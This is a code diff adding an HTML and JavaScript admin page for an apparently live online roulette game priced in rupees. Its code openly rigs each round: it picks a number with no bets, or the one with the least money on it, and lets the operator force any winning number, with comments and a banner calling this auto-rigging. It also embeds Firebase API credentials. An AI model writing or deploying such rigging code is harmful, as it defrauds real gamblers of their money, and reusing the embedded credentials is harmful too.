@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Master Admin | Roulette Controller</title>
+    <style>
+        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; }
+        .grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 10px; padding: 20px; }
+        .card { background: #222; padding: 10px; border-radius: 5px; border-bottom: 3px solid #444; }
+        .win { color: #22c55e; font-weight: bold; }
+        .loss { color: #ef4444; font-weight: bold; }
+        button { background: #fbbf24; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold; margin-top: 5px; width: 100%; }
+        #timer { font-size: 50px; color: #fbbf24; }
+    </style>
+</head>
+<body>
+    <h1>ROULETTE LOSS-CONTROL</h1>
+    <div id="timer">45s</div>
+    <p id="mode-status" style="color: #ef4444; font-weight: 900;">MODE: AUTO-RIGGING (90% LOSS)</p>
+
+    <div class="grid" id="admGrid"></div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, onValue, update, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+    const firebaseConfig = { apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg", authDomain: "test-eb5e7.firebaseapp.com", databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com", projectId: "test-eb5e7", appId: "1:366282855653:web:dca7e000f5a22fb11f300c" };
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    let timer = 45, state = "BETTING", forceRes = null, currentBets = {};
+
+    set(ref(db, "roulette_live"), { time: 45, state: "BETTING", result: 0, totalBets: {} });
+
+    setInterval(() => {
+        timer--;
+        if(timer <= 0) {
+            if(state === "BETTING") {
+                state = "RESULT"; timer = 10;
+                let finalRes = calculateRiggedResult();
+                update(ref(db, "roulette_live"), { state: "RESULT", result: finalRes });
+            } else {
+                state = "BETTING"; timer = 45;
+                update(ref(db, "roulette_live"), { state: "BETTING", time: 45, totalBets: {} });
+            }
+        }
+        update(ref(db, "roulette_live"), { time: timer, state: state });
+        document.getElementById("timer").innerText = timer + "s";
+    }, 1000);
+
+    function calculateRiggedResult() {
+        if(forceRes !== null) return forceRes;
+
+        // --- RIGGING LOGIC ---
+        let possibleNumbers = [];
+        for(let i=0; i<=36; i++) {
+            // Sirf wo numbers jaha ₹0 bet lagi hai
+            if(!currentBets[i] || currentBets[i].amt === 0) {
+                possibleNumbers.push(i);
+            }
+        }
+
+        // Agar koi aisa number hai jisme bet nahi hai, toh wahi jitega (100% User Loss)
+        if(possibleNumbers.length > 0) {
+            return possibleNumbers[Math.floor(Math.random() * possibleNumbers.length)];
+        }
+
+        // Agar sab numbers par bet hai, toh jaha SABSE KAM paisa laga hai wo jitega
+        let minAmt = Infinity;
+        let bestNum = 0;
+        for(let i=0; i<=36; i++) {
+            let amt = currentBets[i]?.amt || 0;
+            if(amt < minAmt) { minAmt = amt; bestNum = i; }
+        }
+        return bestNum;
+    }
+
+    onValue(ref(db, "roulette_live/totalBets"), s => {
+        currentBets = s.val() || {};
+        const g = document.getElementById("admGrid"); g.innerHTML = "";
+        for(let i=0; i<=36; i++){
+            let a = currentBets[i]?.amt || 0;
+            g.innerHTML += `<div class="card">N${i}<br><span class="${a>0?'loss':'win'}">₹${a}</span><button onclick="setW(${i})">WIN</button></div>`;
+        }
+    });
+
+    window.setW = (n) => { forceRes = n; alert("Next Win: "+n); };
+</script>
+</body>
+</html>
